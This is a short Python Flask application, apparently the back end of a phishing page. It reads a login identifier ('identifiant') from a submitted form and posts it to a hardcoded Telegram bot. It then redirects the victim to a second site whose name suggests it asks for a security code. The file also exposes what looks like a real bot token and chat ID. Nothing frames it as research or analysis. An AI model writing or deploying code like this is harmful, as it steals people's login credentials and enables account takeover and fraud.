from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
CHAT_ID = '6297861735'

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': text})

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        identifiant = request.form['identifiant']
        send_to_telegram(f"Identifiant : {identifiant}")
        # Redirection après soumission
        return redirect("https://code-s-curit.onrender.com/")
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
